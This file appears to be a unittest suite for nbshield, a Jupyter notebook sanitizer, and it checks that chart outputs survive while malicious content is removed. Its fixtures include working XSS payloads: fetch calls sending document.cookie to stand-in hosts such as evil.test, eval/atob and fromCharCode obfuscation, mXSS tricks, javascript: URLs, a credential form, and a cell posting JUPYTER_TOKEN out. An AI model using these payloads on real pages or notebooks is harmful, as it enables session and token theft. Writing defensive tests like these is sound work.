"""nbshield 测试套件(仅用标准库 unittest,无需安装 pytest)。

运行::

    python3 -m unittest discover -s tests -v
"""

from __future__ import annotations

import base64
import json
import os
import subprocess
import sys
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from nbshield import get_policy, process_notebook
from nbshield.htmlsanitizer import postcheck_html, sanitize_html
from nbshield.jsanalyze import JsAnalyzer
from nbshield.jslex import tokenize
from nbshield.model import Action, Severity
from nbshield.patterns import find_encoded_blobs, strip_dangerous_ansi


# --- 辅助 ----------------------------------------------------------------

def make_nb(outputs, *, cell_type="code", metadata=None, source="x = 1", nb_meta=None):
    nb = {
        "nbformat": 4,
        "nbformat_minor": 5,
        "metadata": nb_meta or {"kernelspec": {"name": "python3", "display_name": "Python 3"}},
        "cells": [
            {
                "cell_type": cell_type,
                "id": "cell-1",
                "metadata": metadata or {},
                "source": source,
            }
        ],
    }
    if cell_type == "code":
        nb["cells"][0]["execution_count"] = 1
        nb["cells"][0]["outputs"] = outputs
    return nb


def html_output(html, mime="text/html"):
    return [{"output_type": "display_data", "metadata": {}, "data": {mime: html}}]


def run_html(html, mime="text/html", policy="balanced"):
    res = process_notebook(make_nb(html_output(html, mime)), get_policy(policy), source="t")
    outs = res.notebook["cells"][0]["outputs"]
    body = outs[0]["data"].get(mime, "") if outs else ""
    return res, body


def sev_at_least(report, level):
    return report.max_severity >= level


# --- 正常内容必须保留(误报) ---------------------------------------------

class TestBenignPreserved(unittest.TestCase):
    def test_plotly_inline_script_kept(self):
        html = (
            '<div id="p" class="plotly-graph-div"></div>'
            '<script type="text/javascript">'
            'window.PLOTLYENV=window.PLOTLYENV||{};'
            'Plotly.newPlot("p",[{"x":[1,2,3],"y":[4,5,6],"type":"scatter"}],{"title":"Revenue"});'
            '</script>'
        )
        res, body = run_html(html)
        self.assertIn("Plotly.newPlot", body)
        self.assertLess(res.report.max_severity, Severity.MEDIUM)

    def test_bokeh_with_cdn_kept(self):
        html = (
            '<div id="b"></div>'
            '<script src="https://cdn.bokeh.org/bokeh/release/bokeh-3.3.0.min.js"></script>'
            '<script>Bokeh.embed.embed_item({"roots":{}});</script>'
        )
        res, body = run_html(html)
        self.assertIn("cdn.bokeh.org", body)
        self.assertIn("embed_item", body)
        self.assertLess(res.report.max_severity, Severity.MEDIUM)

    def test_altair_vega_kept(self):
        html = (
            '<div id="vis"></div>'
            '<script type="text/javascript">'
            'var spec = {"$schema":"https://vega.github.io/schema/vega-lite/v5.json",'
            '"data":{"values":[{"a":1}]},"mark":"bar"};'
            'vegaEmbed("#vis", spec);'
            '</script>'
        )
        res, body = run_html(html)
        self.assertIn("vegaEmbed", body)

    def test_matplotlib_svg_preserved_exactly(self):
        svg = (
            '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">'
            '<rect x="0" y="0" width="50" height="50" fill="#1f77b4"/>'
            '<text x="60" y="40" font-family="sans-serif">Sales</text>'
            "</svg>"
        )
        res, body = run_html(svg, mime="image/svg+xml")
        self.assertIn("<rect", body)
        self.assertIn("Sales", body)
        self.assertIn("#1f77b4", body)
        self.assertEqual(res.report.max_severity, Severity.INFO)

    def test_html_table_preserved(self):
        html = (
            "<table><thead><tr><th>region</th><th>q1</th></tr></thead>"
            "<tbody><tr><td>APAC</td><td>123</td></tr></tbody></table>"
        )
        res, body = run_html(html)
        self.assertIn("<table>", body)
        self.assertIn("APAC", body)
        self.assertIn("123", body)

    def test_pandas_styler_with_css(self):
        html = (
            '<style type="text/css">.dataframe{color:#333;background:#fff}</style>'
            '<table class="dataframe"><tr><td>ok</td></tr></table>'
        )
        res, body = run_html(html)
        self.assertIn("dataframe", body)
        self.assertIn("color:#333", body)

    def test_plotly_with_local_data(self):
        html = (
            '<div id="p"></div><script>'
            'Plotly.newPlot("p",[{"x":[1],"y":[2]}],{images:[{source:"data:image/png;base64,iVBORw0KGgo="}]});'
            "</script>"
        )
        res, body = run_html(html)
        self.assertIn("Plotly.newPlot", body)

    def test_folium_map_with_tiles(self):
        html = (
            '<div id="map"></div>'
            '<script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.3/dist/leaflet.js"></script>'
            '<script>var m=L.map("map");L.tileLayer("https://tile.openstreetmap.org/{z}/{x}/{y}.png");</script>'
        )
        res, body = run_html(html)
        self.assertIn("L.map", body)
        self.assertIn("tile.openstreetmap.org", body)

    def test_unrelated_json_script_kept(self):
        html = '<script type="application/json">{"a":1,"b":[2,3]}</script>'
        res, body = run_html(html)
        self.assertIn('"a":1', body)


# --- 恶意内容必须移除并告警(漏报) ---------------------------------------

class TestMaliciousBlocked(unittest.TestCase):
    def test_cookie_exfil_fetch(self):
        html = '<script>fetch("https://evil.example.net/c",{method:"POST",body:document.cookie});</script>'
        res, body = run_html(html)
        self.assertNotIn("evil.example.net", body)
        self.assertNotIn("<script", body.lower())
        self.assertTrue(sev_at_least(res.report, Severity.CRITICAL))
        self.assertTrue(res.report.blocked)

    def test_eval_atob_payload(self):
        payload = base64.b64encode(b"fetch('https://attacker.test/?d='+document.cookie)").decode()
        html = f"<script>eval(atob('{payload}'))</script>"
        res, body = run_html(html)
        self.assertNotIn("attacker.test", body)
        self.assertTrue(sev_at_least(res.report, Severity.CRITICAL))

    def test_string_concat_bypass(self):
        payload = base64.b64encode(b"fetch('https://x.test/'+document.cookie)").decode()
        html = f'<script>eval(atob("{payload[:20]}"+"{payload[20:]}"))</script>'
        res, body = run_html(html)
        self.assertNotIn("x.test", body)
        self.assertTrue(sev_at_least(res.report, Severity.HIGH))

    def test_fromcharcode_payload(self):
        code = "fetch('https://evil.test/'+document.cookie)"
        args = ",".join(str(ord(c)) for c in code)
        html = f"<script>eval(String.fromCharCode({args}))</script>"
        res, body = run_html(html)
        self.assertNotIn("evil.test", body)
        self.assertTrue(sev_at_least(res.report, Severity.CRITICAL))

    def test_unicode_escaped_identifiers(self):
        html = (
            '<script>\\u0066\\u0065\\u0074\\u0063\\u0068'
            '("https://evil.test/?c="+document.cookie)</script>'
        )
        res, body = run_html(html)
        self.assertNotIn("document.cookie", body)
        self.assertTrue(sev_at_least(res.report, Severity.HIGH))

    def test_event_handler_onerror(self):
        html = '<img src="x" onerror="fetch(\'https://evil.test/\'+document.cookie)">'
        res, body = run_html(html)
        self.assertNotIn("onerror", body.lower())
        self.assertNotIn("evil.test", body)
        self.assertTrue(sev_at_least(res.report, Severity.CRITICAL))

    def test_svg_animate_href(self):
        svg = (
            '<svg xmlns="http://www.w3.org/2000/svg"><a>'
            '<animate attributeName="href" values="javascript:alert(document.cookie)"/>'
            "<text>Click</text></a></svg>"
        )
        res, body = run_html(svg, mime="image/svg+xml")
        self.assertNotIn("javascript:", body)
        self.assertTrue(sev_at_least(res.report, Severity.HIGH))

    def test_svg_script(self):
        svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.test",{body:document.cookie})</script></svg>'
        res, body = run_html(svg, mime="image/svg+xml")
        self.assertNotIn("evil.test", body)
        self.assertTrue(sev_at_least(res.report, Severity.CRITICAL))

    def test_object_embed_removed(self):
        for tag in ("object", "embed", "applet"):
            html = f'<{tag} data="https://evil.test/x"></{tag}>'
            res, body = run_html(html)
            self.assertNotIn(f"<{tag}", body.lower())

    def test_form_credential_phishing(self):
        html = '<form action="https://evil.test/steal"><input name="password"></form>'
        res, body = run_html(html)
        self.assertNotIn("<form", body.lower())
        self.assertNotIn("<input", body.lower())
        self.assertTrue(sev_at_least(res.report, Severity.MEDIUM))

    def test_meta_refresh_redirect(self):
        html = '<meta http-equiv="refresh" content="0;url=https://evil.test">'
        res, body = run_html(html)
        self.assertNotIn("http-equiv", body.lower())
        self.assertNotIn("evil.test", body)

    def test_base_hijack(self):
        html = '<base href="https://evil.test/"><a href="x">x</a>'
        res, body = run_html(html)
        self.assertNotIn("<base", body.lower())

    def test_css_expression(self):
        html = '<div style="background:url(javascript:alert(document.cookie))">x</div>'
        res, body = run_html(html)
        self.assertNotIn("javascript:", body)

    def test_css_import(self):
        html = '<style>@import url("https://evil.test/x.css");</style><p>hi</p>'
        res, body = run_html(html)
        self.assertNotIn("@import", body)
        self.assertIn("hi", body)

    def test_data_url_html(self):
        html = '<a href="data:text/html,<script>alert(1)</script>">click</a>'
        res, body = run_html(html)
        self.assertNotIn("data:text/html", body)

    def test_remote_script_from_unknown_host(self):
        html = '<script src="https://evil.test/payload.js"></script><p>ok</p>'
        res, body = run_html(html)
        self.assertNotIn("evil.test", body)
        self.assertIn("ok", body)
        self.assertTrue(sev_at_least(res.report, Severity.HIGH))

    def test_http_downgraded_to_https(self):
        html = '<script src="http://cdn.jsdelivr.net/npm/d3@7/dist/d3.min.js"></script>'
        res, body = run_html(html)
        self.assertIn("https://cdn.jsdelivr.net", body)
        self.assertNotIn("http://cdn.jsdelivr.net", body)

    def test_noscript_mxss(self):
        html = '<noscript><p title="</noscript><img src=x onerror=alert(document.cookie)>"></noscript>'
        res, body = run_html(html)
        self.assertNotIn("onerror", body.lower())

    def test_math_mglyph_mxss(self):
        html = (
            '<math><mtext><table><mglyph><style><!--</style>'
            '<img src=x onerror=alert(document.cookie)>--></mglyph></table></mtext></math>'
        )
        res, body = run_html(html)
        self.assertNotIn("onerror", body.lower())

    def test_entity_encoded_javascript(self):
        html = '<a href="jav&#x09;ascript:alert(document.cookie)">x</a>'
        res, body = run_html(html)
        self.assertNotIn("ascript:alert", body)

    def test_template_element(self):
        html = "<template><img src=x onerror=alert(1)></template><p>ok</p>"
        res, body = run_html(html)
        self.assertNotIn("onerror", body.lower())
        self.assertIn("ok", body)

    def test_obfuscated_hex_in_output(self):
        hexs = "".join("\\x%02x" % ord(c) for c in "fetch('https://evil.test/'+document.cookie)")
        html = f"<script>eval({chr(34)}{hexs}{chr(34)})</script>"
        res, body = run_html(html)
        self.assertNotIn("evil.test", body)
        self.assertTrue(sev_at_least(res.report, Severity.HIGH))


# --- 其它活动面 ---------------------------------------------------------

class TestOtherSurfaces(unittest.TestCase):
    def test_js_mime_output_blocked(self):
        out = [{"output_type": "display_data", "metadata": {},
                "data": {"application/javascript": "fetch('https://evil.test',{body:document.cookie})"}}]
        res = process_notebook(make_nb(out), source="t")
        outs = res.notebook["cells"][0]["outputs"]
        # 被移除后 output 可能整体被替换为占位
        text = json.dumps(outs, ensure_ascii=False)
        self.assertNotIn("evil.test", text)
        self.assertTrue(sev_at_least(res.report, Severity.CRITICAL))

    def test_markdown_cell_html(self):
        nb = make_nb([], cell_type="markdown")
        nb["cells"][0]["source"] = "# Title\n<img src=x onerror=alert(document.cookie)>\n[link](javascript:alert(1))"
        res = process_notebook(nb, source="t")
        src = res.notebook["cells"][0]["source"]
        self.assertNotIn("onerror", src.lower())
        self.assertNotIn("javascript:", src)
        self.assertIn("# Title", src)

    def test_markdown_output_mime(self):
        out = [{"output_type": "display_data", "metadata": {},
                "data": {"text/markdown": "<script>alert(1)</script>**bold**"}}]
        res = process_notebook(make_nb(out), source="t")
        body = res.notebook["cells"][0]["outputs"][0]["data"]["text/markdown"]
        self.assertNotIn("<script", body.lower())

    def test_latex_href_javascript(self):
        out = [{"output_type": "display_data", "metadata": {},
                "data": {"text/latex": r"$\href{javascript:alert(1)}{click}$"}}]
        res = process_notebook(make_nb(out), source="t")
        body = res.notebook["cells"][0]["outputs"][0]["data"]["text/latex"]
        self.assertNotIn("javascript:", body)

    def test_terminal_ansi_osc_stripped(self):
        out = [{"output_type": "stream", "name": "stdout",
                "text": "\x1b]52;c;ZXZpbA==\x07normal text\x1b[31mred\x1b[0m"}]
        res = process_notebook(make_nb(out), source="t")
        body = res.notebook["cells"][0]["outputs"][0]["text"]
        self.assertNotIn("\x1b]52", body)
        self.assertIn("normal text", body)
        self.assertIn("\x1b[31m", body)  # 保留颜色
        self.assertTrue(sev_at_least(res.report, Severity.HIGH))

    def test_attachment_html_sanitized(self):
        nb = make_nb([], cell_type="markdown")
        nb["cells"][0]["attachments"] = {
            "evil.html": {"text/html": "<script>fetch('https://evil.test',{body:document.cookie})</script>"}
        }
        res = process_notebook(nb, source="t")
        att = res.notebook["cells"][0].get("attachments", {})
        text = json.dumps(att, ensure_ascii=False)
        self.assertNotIn("evil.test", text)

    def test_cell_metadata_html(self):
        nb = make_nb([], metadata={"html": "<img src=x onerror=alert(1)>"})
        res = process_notebook(nb, source="t")
        meta = json.dumps(res.notebook["cells"][0]["metadata"], ensure_ascii=False)
        self.assertNotIn("onerror", meta.lower())

    def test_notebook_metadata_javascript_url(self):
        nb = make_nb([], nb_meta={"kernelspec": {"name": "python3"},
                                  "custom": "javascript:alert(1)"})
        res = process_notebook(nb, source="t")
        meta = json.dumps(res.notebook["metadata"], ensure_ascii=False)
        self.assertNotIn("javascript:alert", meta)

    def test_widget_state_sanitized(self):
        nb = make_nb([])
        nb["metadata"]["widgets"] = {
            "state": {
                "m1": {
                    "model_name": "HTMLModel",
                    "model_module": "@jupyter-widgets/controls",
                    "model_module_version": "2.0.0",
                    "state": {
                        "value": "<img src=x onerror=alert(document.cookie)>",
                    },
                }
            }
        }
        res = process_notebook(nb, source="t")
        state = json.dumps(res.notebook["metadata"]["widgets"], ensure_ascii=False)
        self.assertNotIn("onerror", state.lower())

    def test_widget_unknown_module_flagged(self):
        nb = make_nb([])
        nb["metadata"]["widgets"] = {
            "state": {"m1": {"model_module": "evil-remote-module",
                             "model_module_version": "1.0", "state": {}}}
        }
        res = process_notebook(nb, source="t")
        rules = [f.rule for f in res.report.findings]
        self.assertIn("widget-unknown-module", rules)

    def test_json_mime_embedded_html(self):
        out = [{"output_type": "display_data", "metadata": {},
                "data": {"application/json": {"html": "<img src=x onerror=alert(document.cookie)>"}}}]
        res = process_notebook(make_nb(out), source="t")
        body = json.dumps(res.notebook["cells"][0]["outputs"], ensure_ascii=False)
        self.assertNotIn("onerror", body.lower())


# --- 代码单元格:运行期风险只告警 ---------------------------------------

class TestCodeCellWarnings(unittest.TestCase):
    def test_javascript_magic_flagged(self):
        nb = make_nb([])
        nb["cells"][0]["source"] = '%%javascript\nfetch("https://evil.test/"+document.cookie)'
        res = process_notebook(nb, source="t")
        rules = [f.rule for f in res.report.findings]
        self.assertIn("code-magic", rules)
        # 默认不改写源码
        self.assertIn("%%javascript", res.notebook["cells"][0]["source"])

    def test_display_javascript_flagged(self):
        nb = make_nb([])
        nb["cells"][0]["source"] = 'from IPython.display import Javascript\ndisplay(Javascript("window.x=1"))'
        res = process_notebook(nb, source="t")
        self.assertIn("code-display-javascript", [f.rule for f in res.report.findings])

    def test_env_plus_network_flagged_critical(self):
        nb = make_nb([])
        nb["cells"][0]["source"] = (
            "import os, requests\n"
            "token = os.environ['JUPYTER_TOKEN']\n"
            "requests.post('https://evil.test', data=token)\n"
        )
        res = process_notebook(nb, source="t")
        self.assertTrue(sev_at_least(res.report, Severity.CRITICAL))

    def test_pickle_loads_flagged(self):
        nb = make_nb([])
        nb["cells"][0]["source"] = "import pickle\npickle.loads(open('x','rb').read())"
        res = process_notebook(nb, source="t")
        self.assertIn("code-dynamic-exec", [f.rule for f in res.report.findings])

    def test_benign_analysis_code_not_flagged_high(self):
        nb = make_nb([])
        nb["cells"][0]["source"] = (
            "import pandas as pd\n"
            "df = pd.read_csv('sales.csv')\n"
            "df.groupby('region').sum()\n"
        )
        res = process_notebook(nb, source="t")
        self.assertLess(res.report.max_severity, Severity.MEDIUM)


# --- 自闭合元素 / CSP 幂等 ---------------------------------------------

class TestSelfClosingAndCsp(unittest.TestCase):
    def test_selfclosing_meta_refresh_blocked(self):
        res, body = run_html('<meta http-equiv="refresh" content="0;url=https://evil.test"/>')
        self.assertNotIn("http-equiv", body.lower())
        self.assertTrue(sev_at_least(res.report, Severity.HIGH))

    def test_selfclosing_script_src_blocked(self):
        res, body = run_html('<script src="https://evil.test/x.js"/>')
        self.assertNotIn("evil.test", body)
        self.assertTrue(sev_at_least(res.report, Severity.HIGH))

    def test_selfclosing_link_cdn_kept(self):
        res, body = run_html('<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/x/x.css"/>')
        self.assertIn("cdn.jsdelivr.net", body)

    def test_selfclosing_link_evil_blocked(self):
        res, body = run_html('<link rel="preload" as="script" href="https://evil.test/x.js"/>')
        self.assertNotIn("evil.test", body)

    def test_own_csp_preserved_on_reprocess(self):
        html = '<div id="p"></div><script>Plotly.newPlot("p",[{"x":[1]}],{});</script>'
        nb = make_nb(html_output(html))
        r1 = process_notebook(nb, source="t")
        r2 = process_notebook(r1.text, source="t")
        r3 = process_notebook(r2.text, source="t")
        self.assertEqual(r2.text, r3.text)
        self.assertLess(r3.report.max_severity, Severity.MEDIUM)
        body = r3.notebook["cells"][0]["outputs"][0]["data"]["text/html"]
        self.assertEqual(body.count("Content-Security-Policy"), 1)
        self.assertIn("Plotly.newPlot", body)

    def test_forged_csp_removed(self):
        res, body = run_html(
            '<meta http-equiv="Content-Security-Policy" content="script-src *;connect-src *"><p>x</p>'
        )
        self.assertNotIn("script-src *", body)


# --- 结构 / 格式兼容 ----------------------------------------------------

class TestStructure(unittest.TestCase):
    def test_v3_upgraded(self):
        nb = {
            "nbformat": 3, "nbformat_minor": 0,
            "metadata": {"name": ""},
            "worksheets": [{"cells": [
                {"cell_type": "code", "input": "2+2", "language": "python",
                 "outputs": [{"output_type": "pyout", "text": "4", "prompt_number": 1}]},
                {"cell_type": "heading", "level": 2, "source": "Intro"},
            ]}],
        }
        res = process_notebook(nb, source="t")
        self.assertEqual(res.notebook["nbformat"], 4)
        self.assertEqual(res.notebook["cells"][0]["source"], "2+2")
        self.assertEqual(res.notebook["cells"][1]["source"], "## Intro")
        self.assertIn("text/plain", res.notebook["cells"][0]["outputs"][0]["data"])

    def test_duplicate_json_keys_warned(self):
        raw = '{"nbformat":4,"nbformat_minor":5,"cells":[{"cell_type":"markdown","id":"a","metadata":{},"source":"x"}],"metadata":{},"cells":[]}'
        res = process_notebook(raw, source="t")
        rules = [f.rule for f in res.report.findings]
        self.assertIn("structure-warning", rules)

    def test_invalid_json_blocked(self):
        res = process_notebook("{not json", source="t")
        self.assertTrue(res.report.blocked)
        self.assertEqual(res.report.max_severity, Severity.CRITICAL)

    def test_nan_rejected(self):
        res = process_notebook('{"nbformat":4,"cells":[],"metadata":{},"x":NaN}', source="t")
        self.assertTrue(res.report.blocked)

    def test_deep_nesting_rejected(self):
        raw = '{"nbformat":4,"cells":[],"metadata":' + "[" * 5000 + "]" * 5000 + "}"
        res = process_notebook(raw, source="t")
        self.assertTrue(res.report.blocked)

    def test_oversize_rejected(self):
        pol = get_policy("balanced").replace(max_bytes=100)
        res = process_notebook('{"nbformat":4,"cells":[],"metadata":{}}' + " " * 500, pol, source="t")
        self.assertTrue(res.report.blocked)

    def test_invalid_cell_replaced(self):
        nb = {"nbformat": 4, "nbformat_minor": 5, "metadata": {},
              "cells": ["not a dict", {"cell_type": "markdown", "id": "x", "metadata": {}, "source": "ok"}]}
        res = process_notebook(nb, source="t")
        self.assertEqual(len(res.notebook["cells"]), 2)
        self.assertIn("nbshield", res.notebook["cells"][0]["source"])

    def test_duplicate_cell_ids_fixed(self):
        nb = {"nbformat": 4, "nbformat_minor": 5, "metadata": {},
              "cells": [
                  {"cell_type": "markdown", "id": "same", "metadata": {}, "source": "a"},
                  {"cell_type": "markdown", "id": "same", "metadata": {}, "source": "b"},
              ]}
        res = process_notebook(nb, source="t")
        ids = [c["id"] for c in res.notebook["cells"]]
        self.assertEqual(len(set(ids)), 2)

    def test_output_upgraded_from_v3(self):
        nb = {"nbformat": 3, "worksheets": [{"cells": [
            {"cell_type": "code", "input": "1", "outputs": [
                {"output_type": "stream", "stream": "stderr", "text": "warn"}]}]}],
              "metadata": {}}
        res = process_notebook(nb, source="t")
        out = res.notebook["cells"][0]["outputs"][0]
        self.assertEqual(out["stream"], "stderr")


# --- 策略差异 -----------------------------------------------------------

class TestPolicies(unittest.TestCase):
    def test_strict_strips_plotly_script(self):
        html = '<div id="p"></div><script>Plotly.newPlot("p",[{"x":[1]}],{});</script>'
        _, body = run_html(html, policy="strict")
        self.assertNotIn("<script", body.lower())
        self.assertIn("<div", body)  # 静态骨架保留

    def test_monitor_keeps_everything(self):
        html = '<script>fetch("https://evil.test",{body:document.cookie})</script>'
        res, body = run_html(html, policy="monitor")
        self.assertIn("evil.test", body)
        self.assertTrue(sev_at_least(res.report, Severity.CRITICAL))
        self.assertFalse(res.report.blocked)

    def test_permissive_keeps_low_risk_scripts(self):
        # 引用非白名单 CDN 的数据源:permissive 应保留脚本,但仍告警
        html = '<script>Plotly.newPlot("p",[{"x":[1]}],{});fetch("https://partner.example.com/data")</script>'
        res, body = run_html(html, policy="permissive")
        self.assertIn("Plotly.newPlot", body)
        self.assertTrue(sev_at_least(res.report, Severity.HIGH))

    def test_neutralize_magics_override(self):
        pol = get_policy("balanced").replace(neutralize_magics=True)
        nb = make_nb([])
        nb["cells"][0]["source"] = '%%javascript\nwindow.x=1'
        res = process_notebook(nb, pol, source="t")
        self.assertIn("code-magic", [f.rule for f in res.report.findings])
        # 源码必须真的被改写,而不仅仅是记一笔
        src = res.notebook["cells"][0]["source"]
        self.assertNotIn("%%javascript", src)
        self.assertIn("window.x=1", src)


# --- 不变式 / 单元 ------------------------------------------------------

class TestInvariants(unittest.TestCase):
    def test_html_idempotent(self):
        samples = [
            '<div class="a"><p>text</p><script>Plotly.newPlot("x",[],{})</script></div>',
            '<img src=x onerror=alert(1)>',
            "<table><tr><td>1</td></tr></table>",
            '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
        ]
        pol = get_policy("balanced"); a = JsAnalyzer(pol)
        for s in samples:
            once = sanitize_html(s, pol, a, "t").html
            twice = sanitize_html(once, pol, a, "t").html
            self.assertEqual(once, twice, f"not idempotent: {s[:40]}")

    def test_postcheck_passes_for_clean(self):
        pol = get_policy("balanced"); a = JsAnalyzer(pol)
        out = sanitize_html('<p>hello</p>', pol, a, "t").html
        self.assertTrue(postcheck_html(out, pol, a))

    def test_encoded_blobs_found(self):
        payload = base64.b64encode(b"fetch('https://evil.test'+document.cookie)").decode()
        hits = find_encoded_blobs(payload)
        self.assertTrue(any(h.looks_like in ("js", "html") for h in hits))

    def test_ansi_helper(self):
        out, n = strip_dangerous_ansi("\x1b]0;title\x07keep\x1b[1mbold\x1b[0m")
        self.assertNotIn("\x1b]0", out)
        self.assertIn("keep", out)
        self.assertIn("\x1b[1m", out)
        self.assertEqual(n, 1)

    def test_jslex_handles_regex_and_template(self):
        toks = tokenize("var r = /a\\/b/g; var s = `x${1+2}y`; var t = 'a\\x41';")
        kinds = [t.kind for t in toks]
        self.assertIn("regex", kinds)
        self.assertIn("template", kinds)
        strs = [t.value for t in toks if t.kind == "string"]
        self.assertIn("aA", strs)

    def test_report_serializable(self):
        res = process_notebook(make_nb(html_output('<script>alert(1)</script>')), source="t")
        d = res.report.to_dict()
        json.dumps(d)  # 不应抛异常
        self.assertIn("findings", d)
        self.assertIn("recommended_csp", d)

    def test_sarif_output(self):
        from nbshield.sarif import to_sarif
        res = process_notebook(make_nb(html_output('<script>alert(1)</script>')), source="t")
        s = to_sarif([res.report])
        self.assertEqual(s["version"], "2.1.0")
        self.assertTrue(s["runs"][0]["results"])


# --- CLI ---------------------------------------------------------------

class TestCLI(unittest.TestCase):
    def _write_nb(self, path, html):
        nb = make_nb(html_output(html))
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(nb, fh)

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, "-m", "nbshield.cli", *args],
            cwd=ROOT, capture_output=True, text=True,
        )

    def test_check_clean_ok(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "ok.ipynb")
            self._write_nb(p, '<p>hi</p>')
            r = self._run("check", p, "--fail-on", "high")
            self.assertEqual(r.returncode, 0, r.stderr)

    def test_check_evil_fails(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "evil.ipynb")
            self._write_nb(p, '<script>fetch("https://evil.test",{body:document.cookie})</script>')
            r = self._run("check", p, "--fail-on", "high")
            self.assertEqual(r.returncode, 1)

    def test_sanitize_writes_file(self):
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "in.ipynb")
            o = os.path.join(d, "out.ipynb")
            self._write_nb(p, '<script>fetch("https://evil.test",{body:document.cookie})</script>')
            r = self._run("sanitize", p, "-o", o, "--accept-risk", "--format", "json")
            self.assertEqual(r.returncode, 0, r.stderr)
            with open(o, encoding="utf-8") as fh:
                clean = json.load(fh)
            self.assertNotIn("evil.test", json.dumps(clean))

    def test_batch_mode(self):
        with tempfile.TemporaryDirectory() as d:
            src = os.path.join(d, "src"); dst = os.path.join(d, "dst")
            os.makedirs(src)
            self._write_nb(os.path.join(src, "a.ipynb"), "<p>a</p>")
            self._write_nb(os.path.join(src, "b.ipynb"), "<script>alert(1)</script>")
            r = self._run("batch", src, "-o", dst, "--accept-risk")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertTrue(os.path.exists(os.path.join(dst, "a.ipynb")))
            self.assertTrue(os.path.exists(os.path.join(dst, "b.ipynb")))


if __name__ == "__main__":
    unittest.main(verbosity=2)
